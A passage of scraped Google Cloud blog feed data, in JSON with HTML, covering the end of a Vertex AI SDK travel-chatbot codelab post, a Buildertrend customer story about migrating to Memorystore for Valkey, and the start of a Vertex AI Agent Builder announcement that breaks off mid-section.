href=\"https://cloud.google.com/vertex-ai/docs/python-sdk/use-vertex-ai-python-sdk?utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Vertex AI SDK</span></a><span style=\"vertical-align: baseline;\">, a complete library for interacting with the </span><a href=\"https://cloud.google.com/vertex-ai?e=48754805&amp;hl=en&amp;utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Vertex AI platform</span></a><span style=\"vertical-align: baseline;\">.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"making_the_first_connection\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/making_the_first_connection.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">While the </span><a href=\"https://cloud.google.com/vertex-ai/docs/python-sdk/use-vertex-ai-python-sdk?utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Vertex AI SDK</span></a><span style=\"vertical-align: baseline;\"> is a powerful tool for the full machine learning lifecycle, this lab focuses on one of its most-used tools: building </span><a href=\"https://cloud.google.com/use-cases/generative-ai?e=48754805&amp;hl&amp;utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">generative AI</span></a><span style=\"vertical-align: baseline;\"> applications. This part of the </span><a href=\"https://cloud.google.com/vertex-ai/docs/python-sdk/use-vertex-ai-python-sdk?utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Vertex AI SDK</span></a><span style=\"vertical-align: baseline;\"> acts as the bridge between your application and the </span><a href=\"https://docs.cloud.google.com/vertex-ai/generative-ai/docs/models?utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini model</span></a><span style=\"vertical-align: baseline;\">. Without it, you would have to manually handle all the complex wiring yourself\u2014writing code to manage authentication, formatting intricate API requests, and parsing the responses. The Vertex AI SDK handles all that complexity for you so you can focus on what you actually want to do: send a message and get a response.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">In </span><a href=\"https://codelabs.developers.google.com/codelabs/production-ready-ai-with-gc/1-developing-apps-that-use-llms/developing-LLM-apps-with-Vertex-AI-SDK#0?utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">this codelab</span></a><span style=\"vertical-align: baseline;\">, you'll see just how simple it is.</span></p>\n<h2><span style=\"vertical-align: baseline;\">Giving your AI purpose with system instructions</span></h2>\n<p><span style=\"vertical-align: baseline;\">Once your app is connected, you'll notice the AI's responses won't be tailored to your purposes yet. One way you can make it more useful for your specific use case is by giving it </span><a href=\"https://cloud.google.com/vertex-ai/generative-ai/docs/learn/prompts/system-instructions?utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">system instructions</span></a><span style=\"vertical-align: baseline;\">.</span></p>\n<h3><span style=\"vertical-align: baseline;\">Hot Tip: Use Google AI Studio to Create Your System Instructions</span></h3>\n<p><span style=\"vertical-align: baseline;\">A great way to develop your </span><a href=\"https://cloud.google.com/vertex-ai/generative-ai/docs/learn/prompts/system-instructions?utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">system instructions</span></a><span style=\"vertical-align: baseline;\"> is to leverage </span><a href=\"https://docs.cloud.google.com/vertex-ai/generative-ai/docs/models?utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini</span></a><span style=\"vertical-align: baseline;\"> as a creative partner to draft them for you. For example, you could ask </span><a href=\"https://docs.cloud.google.com/vertex-ai/generative-ai/docs/models?utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini</span></a><span style=\"vertical-align: baseline;\"> in </span><a href=\"https://aistudio.google.com/welcome?utm_source=google&amp;utm_medium=cpc&amp;utm_campaign=FY25-global-DR-gsem-BKWS-1710442&amp;utm_content=text-ad-none-any-DEV_c-CRE_726176659625-ADGP_Hybrid%20%7C%20BKWS%20-%20EXA%20%7C%20Txt-AI%20Studio-AI%20Studio-KWID_1276544732073-kwd-1276544732073&amp;utm_term=KW_google%20ai%20studio-ST_google%20ai%20studio&amp;gclsrc=aw.ds&amp;gad_source=1&amp;gad_campaignid=21030196240&amp;gbraid=0AAAAACn9t67aW4ac1BtMao1eA_HHRwMKa&amp;gclid=EAIaIQobChMIp_fMhfXHkAMVPgytBh2JBgb2EAAYASAAEgJ3V_D_BwE\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google AI Studio</span></a><span style=\"vertical-align: baseline;\"> to generate a thorough set of instructions for a \"sophisticated and friendly travel assistant.\"</span></p>\n<p><span style=\"vertical-align: baseline;\">Once you have a draft, you can immediately test it, also in </span><a href=\"https://aistudio.google.com/welcome?utm_source=google&amp;utm_medium=cpc&amp;utm_campaign=FY25-global-DR-gsem-BKWS-1710442&amp;utm_content=text-ad-none-any-DEV_c-CRE_726176659625-ADGP_Hybrid%20%7C%20BKWS%20-%20EXA%20%7C%20Txt-AI%20Studio-AI%20Studio-KWID_1276544732073-kwd-1276544732073&amp;utm_term=KW_google%20ai%20studio-ST_google%20ai%20studio&amp;gclsrc=aw.ds&amp;gad_source=1&amp;gad_campaignid=21030196240&amp;gbraid=0AAAAACn9t67aW4ac1BtMao1eA_HHRwMKa&amp;gclid=EAIaIQobChMIp_fMhfXHkAMVPgytBh2JBgb2EAAYASAAEgJ3V_D_BwE\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Google AI Studio</span></a><span style=\"vertical-align: baseline;\">. Start a new chat and in the panel to the right, set the </span><a href=\"https://docs.cloud.google.com/vertex-ai/generative-ai/docs/models?utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini model</span></a><span style=\"vertical-align: baseline;\"> to the one you're using in your app and paste the text into the system instruction field. This allows you to quickly interact with the model and see how it behaves with your instructions, all without writing any code. When you're happy with the results, you can copy the final version directly into your application.</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"Google AI Studio\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/Google_AI_Studio.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h2><span style=\"vertical-align: baseline;\">Connecting Your AI to the Real World</span></h2>\n<p><span style=\"vertical-align: baseline;\">This is where you break the model out of its knowledge silo and connect it to live data. By default, an </span><a href=\"https://cloud.google.com/discover/what-is-an-ai-model?e=48754805&amp;hl=en&amp;utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI model</span></a><span style=\"vertical-align: baseline;\">'s knowledge is limited to the data it was trained on; it doesn't know today's weather. However, you can provide </span><a href=\"https://docs.cloud.google.com/vertex-ai/generative-ai/docs/models?utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini</span></a><span style=\"vertical-align: baseline;\"> with access to external knowledge using a powerful feature called </span><a href=\"https://docs.cloud.google.com/vertex-ai/generative-ai/docs/multimodal/function-calling?utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">function calling</span></a><span style=\"vertical-align: baseline;\">!\u00a0</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"function-calling\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/function-calling.max-1000x1000.png\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">The concept is simple: you write a basic Python function (like one to check the weather) and then describe that tool to the model. Then, when a user asks about the weather, the model can ask your application to run your function and use the live result in its answer. This allows the model to answer questions far beyond its training data, making it a much more powerful and useful assistant with access to up-to-the-minute information.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">In </span><a href=\"https://codelabs.developers.google.com/codelabs/production-ready-ai-with-gc/1-developing-apps-that-use-llms/developing-LLM-apps-with-Vertex-AI-SDK#0?utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">this lab</span></a><span style=\"vertical-align: baseline;\">, we used the </span><a href=\"https://open-meteo.com/en/docs/geocoding-api\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Geocoding API</span></a><span style=\"vertical-align: baseline;\"> and the </span><a href=\"https://open-meteo.com/en/docs\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Weather Forecast API</span></a><span style=\"vertical-align: baseline;\"> to provide the app with the ability to factor in the weather when answering questions about travel.\u00a0</span></p>\n<h2><span style=\"vertical-align: baseline;\">Your Journey Starts Here</span></h2>\n<p><span style=\"vertical-align: baseline;\">Building with </span><a href=\"https://cloud.google.com/learn/what-is-artificial-intelligence?e=48754805&amp;hl=en&amp;utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI</span></a><span style=\"vertical-align: baseline;\"> isn't about knowing everything at once. It's about taking the first step, building something tangible, and learning key concepts along the way. </span><a href=\"https://codelabs.developers.google.com/codelabs/production-ready-ai-with-gc/1-developing-apps-that-use-llms/developing-LLM-apps-with-Vertex-AI-SDK#0?utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">This codelab</span></a><span style=\"vertical-align: baseline;\"> was designed to be that first step. By the end, you won't just have a working travel chatbot\u2014you'll have hands-on experience with the fundamental building blocks of a production-ready </span><a href=\"https://cloud.google.com/discover/ai-applications?e=48754805&amp;hl=en&amp;utm_campaign=CDR_0x6e136736_default_b452058013&amp;utm_medium=external&amp;utm_source=blog\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AI application</span></a><span style=\"vertical-align: baseline;\">. You'll be surprised at what you can build.</span></p>\n<p><span style=\"vertical-align: baseline;\">Share your progress and connect with others on the journey using the hashtag </span><strong style=\"vertical-align: baseline;\">#ProductionReadyAI</strong><span style=\"vertical-align: baseline;\">. Happy learning!\u00a0</span></p></div>",
        "published_date": "2025-11-06 10:15:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/databases/buildertrend-migrates-to-memorystore-for-valkey/",
        "title": "How Buildertrend Drives Innovation with Memorystore for Valkey",
        "thumbnail": null,
        "author": "Ankit Sud",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><strong style=\"font-style: italic; vertical-align: baseline;\">Editor\u2019s note:</strong><span style=\"font-style: italic; vertical-align: baseline;\"> Today we hear from Buildertrend, a leading provider of cloud-based construction management software. Since 2006, the platform has helped more than a million users globally simplify business management, track financials, and improve communication. To support this massive scale and their ambitious vision, they rely on a robust technology stack on Google Cloud, including, recently, Memorystore for Valkey. Read on to hear about their migration from Memorystore for Redis to the new platform.</span></p>\n<hr />\n<p><span style=\"vertical-align: baseline;\">Running a construction business is a complex balancing act that requires a constant stream of real-time information to keep projects on track. At </span><strong style=\"vertical-align: baseline;\">Buildertrend, </strong><span style=\"vertical-align: baseline;\">we understand the challenges our customers face \u2014 from fluctuating material costs and supply chain delays to managing tight deadlines and the risk of budget overruns \u2014 and work to help construction professionals improve efficiency, reduce risk, and enhance collaboration, all while growing their bottom line.\u00a0</span></p>\n<h3><strong style=\"vertical-align: baseline;\">The challenge: Caching at scale</strong></h3>\n<p><span style=\"vertical-align: baseline;\">The construction industry has historically been slow to adopt new technologies, hindering efficiency and scalability. At Buildertrend, we aim to change this by being at the forefront of adopting new technology. When </span><a href=\"https://cloud.google.com/blog/products/databases/announcing-general-availability-of-memorystore-for-valkey\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Memorystore for Valkey became generally available</span></a><span style=\"vertical-align: baseline;\">, we spent time looking into whether it could help us modernize our stack and deliver value to customers. We were attracted by Valkey's truly open source posture and its promised performance benefits over competing technologies.</span></p>\n<p><span style=\"vertical-align: baseline;\">Before adopting Memorystore for Valkey, we had used Memorystore for Redis. While it served our basic needs, we found ourselves hitting a wall when it came to a critical feature: native cross-regional replication. As we scaled, we needed a solution that could support a global user base and provide seamless failover in case of a disaster or other issues within a region. We also needed a modern connectivity model such as Google Cloud\u2019s </span><a href=\"https://cloud.google.com/vpc/docs/private-service-connect\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Private Service Connect</span></a><span style=\"vertical-align: baseline;\"> to enhance network security and efficiency.</span></p>\n<p><span style=\"vertical-align: baseline;\">As a fully managed, scalable, and highly available in-memory data store, Memorystore for Valkey offered the key features we needed out of the box to take our platform to the next level.\u00a0</span></p>\n<h3><strong style=\"vertical-align: baseline;\">A modern solution for a modern problem</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Within this ecosystem, we use Memorystore for Valkey for a variety of critical functions, including:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Database-backed cache:</strong><span style=\"vertical-align: baseline;\"> Speeds up data retrieval for a faster user experience</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Session state:</strong><span style=\"vertical-align: baseline;\"> Manages user sessions for web applications</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Job storage:</strong><span style=\"vertical-align: baseline;\"> Handles asynchronous task queues for background processes</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Pub/Sub idempotency keys:</strong><span style=\"vertical-align: baseline;\"> Ensures messages are processed exactly once, preventing data duplication</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Authentication tokens</strong><span style=\"vertical-align: baseline;\">: Securely validates user identity with cryptographically signed tokens, enabling fast, scalable authentication</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">By leveraging the cache in these scenarios, our application is fast, resilient, and ready to meet the demands of our growing customer base. The native cross regional replication helped us support a global user base without having to worry about keeping global caches in sync.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">A seamless migration with minimal disruption</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Migrating from Memorystore for Redis to Memorystore for Valkey was a smooth process, thanks to close collaboration with the Google Cloud team. We worked with the Google Cloud team to identify the best approach, which for us involved exporting data to Google Cloud Storage and seeding the data at Valkey instance creation, allowing us to migrate with minimal downtime. Because Memorystore for Valkey natively supports Private Service Connect, we were able to eliminate a proxy layer that our engineers used to connect to our Memorystore for Redis instances, simplifying our stack and improving our networking posture.</span><strong style=\"vertical-align: baseline;\">\u00a0</strong></p>\n<h3><strong style=\"vertical-align: baseline;\">Looking ahead to a global future</strong></h3>\n<p><span style=\"vertical-align: baseline;\">Although it's still early in our journey, the impact is already clear. Memorystore for Valkey has unlocked our ability to scale and drastically reduced our time to market. It has allowed our team to streamline and own deployment processes, so they can be more agile and responsive.</span></p>\n<p><span style=\"vertical-align: baseline;\">For us, the future is about global scalability. With nearly 300 Memorystore for Valkey instances in our fleet, we're building a globally available, cloud-native stack. Our most critical instances are highly optimized to serve up to 30,000 requests per second each, demonstrating the foundation's scalability and performance.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">We strive to use scalable cloud-native technologies, and Memorystore for Valkey will enable us to continue down this path. By using the Memorystore for Valkey managed service, we not only solve technical problems, but also accelerate business growth and empower engineering teams to focus on what matters most: </span><strong style=\"vertical-align: baseline;\">building great products</strong><span style=\"vertical-align: baseline;\">.</span></p>\n<h3><strong style=\"vertical-align: baseline;\">Ready to build with Memorystore for Valkey?</strong></h3>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Like Buildertrend, you can leverage the power of a fully managed, scalable, and highly available in-memory data store to accelerate your applications and empower your development teams.</span></p>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">To get started, explore the </span><a href=\"https://cloud.google.com/memorystore/docs/valkey\"><span style=\"font-style: italic; text-decoration: underline; vertical-align: baseline;\">Memorystore for Valkey documentation</span></a><span style=\"font-style: italic; vertical-align: baseline;\"> and sign up for a Google Cloud account!</span></p></div>",
        "published_date": "2025-11-05 17:00:00"
    },
    {
        "website": "GOOGLE_CLOUD_BLOG",
        "link": "https://cloud.google.com/blog/products/ai-machine-learning/more-ways-to-build-and-scale-ai-agents-with-vertex-ai-agent-builder/",
        "title": "More ways to build, scale, and govern AI agents with Vertex AI Agent Builder",
        "thumbnail": "https://storage.googleapis.com/gweb-cloudblog-publish/images/AI_agents_with_Vertex_AI_Agent_Builder.max-600x600.jpg",
        "author": "Mike Clark",
        "track": null,
        "description": "<div class=\"block-paragraph_advanced\"><p><span style=\"vertical-align: baseline;\">Many developers are prototyping AI agents, but moving to a scalable, secure, and well-managed production agent is far more complex.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">Vertex AI </span><a href=\"https://cloud.google.com/products/agent-builder?e=48754805&amp;hl=en\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Agent Builder</span></a><span style=\"vertical-align: baseline;\"> is Google Cloud's comprehensive and open platform to build, scale, and govern reliable agents. As a suite of products, it provides the choice builders need to create powerful agentic systems at global scale.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">Since </span><a href=\"https://cloud.google.com/vertex-ai/generative-ai/docs/agent-builder/overview\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Agent Builder's</span></a><span style=\"vertical-align: baseline;\"> public inception earlier this year, we've seen tremendous traction with components such as our Python </span><strong style=\"vertical-align: baseline;\">Agent Development Kit (ADK), </strong><span style=\"vertical-align: baseline;\">which has been downloaded over</span> <a href=\"https://pepy.tech/projects/google-adk?timeRange=threeMonths&amp;category=version&amp;includeCIDownloads=true&amp;granularity=daily&amp;viewType=line&amp;versions=1.17.0%2C1.16.0%2C1.15.1\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">7 million times</strong><span style=\"text-decoration: underline; vertical-align: baseline;\">. </span></a><span style=\"vertical-align: baseline;\">Agent Development Kit also powers agents for customers using </span><a href=\"https://cloud.google.com/blog/products/ai-machine-learning/introducing-gemini-enterprise?e=48754805?utm_source%3Dlinkedin\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Gemini Enterprise</span></a><span style=\"vertical-align: baseline;\"> and agents operating in products across Google.\u00a0</span></p>\n<p><span style=\"vertical-align: baseline;\">Today, we build on that momentum by announcing new capabilities across the entire agent lifecycle to help you build, scale, and govern AI agents. Now, you can:\u00a0</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Build</strong><span style=\"vertical-align: baseline;\"> faster with</span><strong style=\"vertical-align: baseline;\"> control </strong><span style=\"vertical-align: baseline;\">agent context and reduce token usage with configurable context layers (Static, Turn, User, Cache)</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">via the ADK API.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Scale</strong><span style=\"vertical-align: baseline;\"> in production with new managed services from the </span><strong style=\"vertical-align: baseline;\">Vertex AI Agent Engine (AE) </strong><span style=\"vertical-align: baseline;\">including new </span><strong style=\"vertical-align: baseline;\">observability and evaluation </strong><span style=\"vertical-align: baseline;\">capabilities\u00a0</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Govern</strong><span style=\"vertical-align: baseline;\"> agents with confidence with new</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">features</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">including </span><strong style=\"vertical-align: baseline;\">native</strong><span style=\"vertical-align: baseline;\"> </span><strong style=\"vertical-align: baseline;\">agent identities</strong><span style=\"vertical-align: baseline;\"> and </span><strong style=\"vertical-align: baseline;\">security safeguards</strong></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">These new capabilities underscore our commitment to Agent Builder, and simplify the agent development lifecycle to meet you where you are, no matter which tech stack you choose.\u00a0</span></p>\n<p><strong style=\"vertical-align: baseline;\">For reference, here\u2019s what to use, and when:</strong></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"1\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/images/1_GgDhTHh.max-1000x1000.png\" />\n        \n        </a>\n      \n        <figcaption class=\"article-image__caption \"><p>This diagram showcases the comprehensive makeup of Agent Builder neatly organized into the build, scale, and govern pillars.</p></figcaption>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">1. Build your AI agents faster</span></h3>\n<p><span style=\"vertical-align: baseline;\">Building an agent from a concept to a working product involves complex orchestration. That\u2019s why we\u2019ve improved </span><a href=\"https://google.github.io/adk-docs/\" rel=\"noopener\" target=\"_blank\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">ADK</strong></a><span style=\"vertical-align: baseline;\"> for your building experience:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Build more robust agents:</strong><span style=\"vertical-align: baseline;\"> Use our adaptable plugins framework for custom logic (like policy enforcement or usage tracking). Or use our prebuilt plugins, including a new plugin for tool use that helps agents 'self-heal.' This means the agent can recognize when a tool call has failed and automatically retry the action in a new way.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">More language support: </strong><span style=\"vertical-align: baseline;\">We are also enabling Go developers to build ADK agents (with a dedicated A2A Go SDK) alongside Python and Java, making the framework accessible to many more developers.</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Single command deployment</strong><span style=\"vertical-align: baseline;\">: Once you have built an agent, you can now use the ADK CLI to deploy agents using a single command, </span><strong style=\"vertical-align: baseline;\">adk deploy</strong><code style=\"vertical-align: baseline;\">,</code><span style=\"vertical-align: baseline;\">to the Agent Engine (AE) runtime. This is a major upgrade to help you move your agent from local development to\u00a0 live testing and production usage quickly and seamlessly.</span></p>\n</li>\n</ul>\n<p><span style=\"vertical-align: baseline;\">You can start building today with </span><a href=\"https://github.com/google/adk-samples\" rel=\"noopener\" target=\"_blank\"><span style=\"text-decoration: underline; vertical-align: baseline;\">adk-samples</span></a><span style=\"vertical-align: baseline;\"> on GitHub or on Vertex AI </span><a href=\"http://console.cloud.google.com/vertex-ai/agents/agent-garden\"><span style=\"text-decoration: underline; vertical-align: baseline;\">Agent Garden</span><span style=\"vertical-align: baseline;\"> -</span></a><span style=\"vertical-align: baseline;\"> a growing repository of curated agent samples, solutions, and tools, designed to accelerate your development and support one click deployment of your agents built with ADK.</span></p>\n<h3><span style=\"vertical-align: baseline;\">2. Scale your AI agents effectively</span></h3>\n<p><span style=\"vertical-align: baseline;\">Once your agent is built and deployed, the next step is running it in production. As you scale from one agent to many, managing them effectively becomes a key challenge. That\u2019s why we continue to expand the managed services available in </span><a href=\"https://docs.cloud.google.com/agent-builder/agent-engine/overview\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">Agent Engine</strong></a><strong style=\"vertical-align: baseline;\">.</strong><span style=\"vertical-align: baseline;\"> It provides the core capabilities for deploying and scaling the agents you create in Agent Builder</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Observability</strong><span style=\"vertical-align: baseline;\">: We\u2019re bringing the local development environment that you know and love from </span><code style=\"vertical-align: baseline;\">adk web </code><span style=\"vertical-align: baseline;\">to Google Cloud to enable Cloud based production monitoring. Within Agent Engine, we are making it easy to:\u00a0</span></p>\n</li>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Track key agent performanc</strong><span style=\"vertical-align: baseline;\">e metrics with a dashboard that measures token consumption, latency, error rates, and tool calls over time.\u00a0</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Find and fix production issues faster</strong><span style=\"vertical-align: baseline;\"> in a </span><strong style=\"vertical-align: baseline;\">traces tab </strong><span style=\"vertical-align: baseline;\">so you can dive into flyouts to visualize and understand the sequence of actions your agents are taking.\u00a0</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Interact with your deployed agent </strong><span style=\"vertical-align: baseline;\">(including past sessions or issues) with a </span><strong style=\"vertical-align: baseline;\">playground </strong><span style=\"vertical-align: baseline;\">to dramatically shorten your debug loop.</span></p>\n</li>\n</ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Quality &amp; evaluation:</strong><span style=\"vertical-align: baseline;\"> You told us that evaluating non-deterministic systems is a major challenge. We agree. Now, you can simulate agent performance using the new </span><strong style=\"vertical-align: baseline;\">Evaluation Layer</strong><span style=\"vertical-align: baseline;\"> that includes a </span><strong style=\"vertical-align: baseline;\">User Simulator</strong><span style=\"vertical-align: baseline;\">.\u00a0</span></p>\n</li>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Simplified access:</strong><span style=\"vertical-align: baseline;\"> You can use the ADK CLI to deploy to the Agent Engine runtime and use </span><a href=\"https://docs.cloud.google.com/agent-builder/agent-engine/overview#express-mode\"><span style=\"text-decoration: underline; vertical-align: baseline;\">AE sessions and memory without signing up for a Google Cloud account</span></a><span style=\"vertical-align: baseline;\">. </span><span style=\"vertical-align: baseline;\">Sign up using your Gmail address</span><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">and get started for free for up to 90 days. If you have a Google Cloud account, </span><span style=\"vertical-align: baseline;\">the AE runtime now offers a </span><a href=\"https://cloud.google.com/vertex-ai/pricing#vertex-ai-agent-engine\"><strong style=\"text-decoration: underline; vertical-align: baseline;\">free tier</strong></a><strong style=\"vertical-align: baseline;\"> </strong><span style=\"vertical-align: baseline;\">so you can deploy and experiment without hesitation.\u00a0</span></p>\n</li>\n</ul>\n<p><span style=\"font-style: italic; vertical-align: baseline;\">Below is a demo showcasing the new observability features in actions such as an updated AE dashboard, traces, and playground within Agent Engine</span></p></div>\n<div class=\"block-image_full_width\">\n\n\n\n\n\n\n  \n    <div class=\"article-module h-c-page\">\n      <div class=\"h-c-grid\">\n  \n\n    <figure class=\"article-image--large\n      \n      \n        h-c-grid__col\n        h-c-grid__col--6 h-c-grid__col--offset-3\n        \n        \n      \">\n\n      \n      \n        \n        <img alt=\"2\" src=\"https://storage.googleapis.com/gweb-cloudblog-publish/original_images/2_QOneucA.gif\" />\n        \n        </a>\n      \n    </figure>\n\n  \n      </div>\n    </div>\n  \n\n\n\n\n</div>\n<div class=\"block-paragraph_advanced\"><h3><span style=\"vertical-align: baseline;\">3. Govern your AI agents with confidence</span></h3>\n<p><span style=\"vertical-align: baseline;\">Now that you can measure your agent performance at scale the final stage of the lifecycle is ensuring they operate safely and responsibly. New and expanded capabilities include:</span></p>\n<ul>\n<li style=\"vertical-align: baseline;\">\n<p><strong style=\"vertical-align: baseline;\">Agent identities:</strong><span style=\"vertical-align: baseline;\"> Building on our existing 